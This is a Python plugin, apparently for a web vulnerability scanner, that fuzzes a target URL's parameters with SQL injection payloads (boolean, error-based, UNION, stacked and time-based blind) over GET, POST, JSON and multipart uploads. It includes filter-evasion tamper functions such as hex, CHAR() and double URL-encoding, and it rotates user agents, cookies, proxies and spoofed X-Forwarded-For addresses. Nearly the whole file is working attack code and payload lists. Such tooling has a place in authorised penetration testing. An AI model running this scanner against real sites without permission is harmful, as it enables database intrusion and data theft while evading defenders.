#!/usr/bin/env python3
"""
Supports GET, POST, JSON, multipart/form-data, blind/time-based. Rotates user-agent, cookies, proxies, applies wide tamper/encoding strategies.

Requires: pip install requests_toolbelt
"""

import requests
import random
import urllib.parse
import json
import time
from requests_toolbelt.multipart.encoder import MultipartEncoder

ERROR_SIGNATURES = [
    "SQL syntax", "mysql_fetch", "ODBC", "Warning",
    "error in your SQL", "Query failed", "near", "unterminated",
    "Unknown column", "ORA-", "PG::", "psql:", "sqlite",
    "syntax error", "invalid input", "You have an error in your SQL"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F)"
]

COOKIES = [
    "sessionid=fake1234; XSRF-TOKEN=abcd",
    "auth=token_example; csrftoken=defg",
    "user=admin"
]

# You can add actual proxy configs as needed
PROXIES = [
    None,
    # {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
]

def inline_comment(payload): return payload.replace(" OR ", "/**/OR/**/").replace(" AND ", "/**/AND/**/").replace("=", "/**/=/**/")
def charcode(payload): return "CHAR(" + ",".join(str(ord(c)) for c in payload) + ")"
def concat(payload): return f"'||{payload}||'"
def hex_encode(payload): return "0x" + payload.encode("utf-8").hex()
def random_case(payload): return ''.join([c.upper() if i % 2 else c for i, c in enumerate(payload)])
def double_encode(payload): return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
def add_comment(payload): return payload + " --"
def between_case(payload): return payload.replace("or", "o/**/r").replace("and", "a/**/nd").replace("=", "%2f*eq%2f*/=")

TAMPERS = [
    lambda x: x, add_comment, inline_comment, charcode, concat,
    hex_encode, between_case, random_case, double_encode
]

PARAMS = [
    "id", "user", "uid", "cat", "search", "q", "pid", "item", "order",
    "product", "type", "name", "ref", "key", "token", "code", "article",
    "page", "file", "ids", "email", "number", "upload", "image"
]

BOOLEAN_PAYLOADS = [
    ("1 OR 1=1", "1 AND 1=2"), ("' OR 'x'='x", "' AND 'x'='y"),
    ("1' OR 1=1--", "1' AND 1=2--"), ('1") OR ("x"="x', '1") AND ("x"="y')
]
ERROR_PAYLOADS = [
    "'", "\"", "');--", "';", "\";", "' OR ''='", "'\"`", "`", "\\",
    "')", "\"))", "' OR SLEEP(5)#", "' OR 123=123--+", "' OR 1=1#", '" OR 1=1#"'
]
UNION_PAYLOADS = [
    "1 UNION SELECT NULL-- -", "1 UNION SELECT 1,2,3-- -",
    "' UNION SELECT version(),user(),database()--+",
    "1 UNION SELECT concat('sqlitestart',sqlite_version(),'sqliteend')--"
]
STACKED_PAYLOADS = [
    "1; SELECT sleep(5)--", "1'; SELECT pg_sleep(5)--", "1'; WAITFOR DELAY '0:0:5'--"
]
TIME_BLIND_PAYLOADS = [
    "' OR SLEEP(6)--", "' OR 'x'='x' AND SLEEP(6)--", "' OR 1=1 AND SLEEP(6)--",
    "1'; SELECT pg_sleep(6)--", "'; waitfor delay '0:0:6'--"
]

def run(response, url):
    """
    Full-spectrum SQLi fuzz (GET, POST, JSON, multipart, time-based/blind, headers/cookies/proxy randomization).
    Args:
      response: requests.Response if chained (can be None here)
      url: URL string to test
    Returns:
      List of findings dicts (first major hit returns early—modify as needed)
    """
    findings = []
    session = requests.Session()
    proxies = random.choice(PROXIES)

    for param_name in PARAMS:
        for tamper in TAMPERS:
            ua = random.choice(USER_AGENTS)
            cookies_dict = dict([c.split("=") for c in random.choice(COOKIES).split("; ") if "=" in c])
            headers = {
                "User-Agent": ua,
                "Referer": url,
                "X-Forwarded-For": ".".join(str(random.randint(1,255)) for _ in range(4))
            }

            # Blind/time-based GET
            for blind_pay in TIME_BLIND_PAYLOADS:
                bpay = tamper(blind_pay)
                params = {param_name: bpay}
                try:
                    start = time.time()
                    r = session.get(url, params=params, headers=headers, cookies=cookies_dict, timeout=15, proxies=proxies)
                    elapsed = time.time() - start
                    if r.status_code == 200 and elapsed > 5:
                        findings.append({
                            "type": "SQLi-Blind-Time",
                            "description": f"Possible blind SQLi (delay {elapsed:.2f}s) on param {param_name}: {bpay}",
                            "param": param_name,
                            "payload": bpay,
                            "plugin": "sqli_ultimate",
                            "severity": "critical",
                            "headers": headers,
                            "cookies": cookies_dict,
                            "delay": elapsed,
                            "url": url
                        })
                        return findings
                except Exception:
                    continue

            # Boolean GET
            for true_pay, false_pay in BOOLEAN_PAYLOADS:
                tr, fa = tamper(true_pay), tamper(false_pay)
                params_true = {param_name: tr}
                params_false = {param_name: fa}
                try:
                    r_true = session.get(url, params=params_true, headers=headers, cookies=cookies_dict, timeout=12, proxies=proxies)
                    r_false = session.get(url, params=params_false, headers=headers, cookies=cookies_dict, timeout=12, proxies=proxies)
                    if r_true.status_code == r_false.status_code == 200 and abs(len(r_true.text) - len(r_false.text)) > 14:
                        findings.append({
                            "type": "SQLi-Boolean",
                            "description": f"Boolean response diff for '{param_name}' with tamper {tamper.__name__}",
                            "param": param_name,
                            "payload": tr,
                            "plugin": "sqli_ultimate",
                            "severity": "high",
                            "headers": headers,
                            "cookies": cookies_dict,
                            "url": url
                        })
                        return findings
                except Exception:
                    continue

            # Boolean POST
            for true_pay, false_pay in BOOLEAN_PAYLOADS:
                tr, fa = tamper(true_pay), tamper(false_pay)
                try:
                    data_true = {param_name: tr}
                    data_false = {param_name: fa}
                    r_true = session.post(url, data=data_true, headers=headers, cookies=cookies_dict, timeout=12, proxies=proxies)
                    r_false = session.post(url, data=data_false, headers=headers, cookies=cookies_dict, timeout=12, proxies=proxies)
                    if r_true.status_code == r_false.status_code == 200 and abs(len(r_true.text) - len(r_false.text)) > 14:
                        findings.append({
                            "type": "SQLi-Boolean-POST",
                            "description": f"Boolean response diff on POST for '{param_name}'",
                            "param": param_name,
                            "payload": tr,
                            "plugin": "sqli_ultimate",
                            "severity": "medium",
                            "headers": headers,
                            "cookies": cookies_dict,
                            "url": url
                        })
                        return findings
                except Exception:
                    continue

            # Error GET
            for error_payload in ERROR_PAYLOADS:
                errp = tamper(error_payload)
                params_err = {param_name: errp}
                try:
                    r = session.get(url, params=params_err, headers=headers, cookies=cookies_dict, timeout=12, proxies=proxies)
                    for sig in ERROR_SIGNATURES:
                        if sig.lower() in r.text.lower():
                            findings.append({
                                "type": "SQLi-Error",
                                "description": f"Error sig '{sig}' for param {param_name}: {errp}",
                                "param": param_name,
                                "payload": errp,
                                "plugin": "sqli_ultimate",
                                "severity": "critical",
                                "headers": headers,
                                "cookies": cookies_dict,
                                "url": url
                            })
                            return findings
                except Exception:
                    continue

            # Union GET
            for union_pay in UNION_PAYLOADS:
                unp = tamper(union_pay)
                params_union = {param_name: unp}
                try:
                    r = session.get(url, params=params_union, headers=headers, cookies=cookies_dict, timeout=12, proxies=proxies)
                    if any(x in r.text for x in ["NULL", "postgres", "admin", "root", "sqlitestart", "sqliteend", "version()", "information_schema", "dbname"]):
                        findings.append({
                            "type": "SQLi-Union",
                            "description": f"UNION trigger on {param_name}: {unp}",
                            "param": param_name,
                            "payload": unp,
                            "plugin": "sqli_ultimate",
                            "severity": "high",
                            "headers": headers,
                            "cookies": cookies_dict,
                            "url": url
                        })
                        return findings
                except Exception:
                    continue

            # Stack GET
            for stack_pay in STACKED_PAYLOADS:
                stp = tamper(stack_pay)
                params_stack = {param_name: stp}
                try:
                    r = session.get(url, params=params_stack, headers=headers, cookies=cookies_dict, timeout=13, proxies=proxies)
                    if r.status_code == 200 and len(r.text) > 180:
                        findings.append({
                            "type": "SQLi-Stacked",
                            "description": f"Possible stacked SQL for {param_name}: {stp}",
                            "param": param_name,
                            "payload": stp,
                            "plugin": "sqli_ultimate",
                            "severity": "medium",
                            "headers": headers,
                            "cookies": cookies_dict,
                            "url": url
                        })
                        return findings
                except Exception:
                    continue

            # POST JSON (for APIs)
            for union_pay in UNION_PAYLOADS:
                unp = tamper(union_pay)
                try:
                    json_data = json.dumps({param_name: unp})
                    r = session.post(url, data=json_data, headers={**headers, "Content-Type": "application/json"}, cookies=cookies_dict, timeout=13, proxies=proxies)
                    if r.status_code == 200 and any(x in r.text for x in ["NULL", "postgres", "admin", "root", "sqlitestart", "sqliteend", "version()", "information_schema", "dbname"]):
                        findings.append({
                            "type": "SQLi-Union-JSON",
                            "description": f"UNION (JSON) param {param_name}: {unp}",
                            "param": param_name,
                            "payload": unp,
                            "plugin": "sqli_ultimate",
                            "severity": "high",
                            "headers": headers,
                            "cookies": cookies_dict,
                            "url": url
                        })
                        return findings
                except Exception:
                    continue

            # Multipart/form upload fuzz (for param names file/image/upload...)
            if "file" in param_name or "image" in param_name or "upload" in param_name:
                for ep in ERROR_PAYLOADS:
                    epay = tamper(ep)
                    try:
                        multipart_data = MultipartEncoder(fields={param_name: ('payload.txt', epay, 'text/plain')})
                        headers_mp = {**headers, "Content-Type": multipart_data.content_type}
                        r = session.post(url, data=multipart_data, headers=headers_mp, cookies=cookies_dict, timeout=13, proxies=proxies)
                        for sig in ERROR_SIGNATURES:
                            if sig.lower() in r.text.lower():
                                findings.append({
                                    "type": "SQLi-Error-Multipart",
                                    "description": f"Multipart SQLi error pattern in {param_name} (file field): {sig}",
                                    "param": param_name,
                                    "payload": epay,
                                    "plugin": "sqli_ultimate",
                                    "severity": "high",
                                    "headers": headers_mp,
                                    "cookies": cookies_dict,
                                    "url": url
                                })
                                return findings
                    except Exception:
                        continue

    return findings
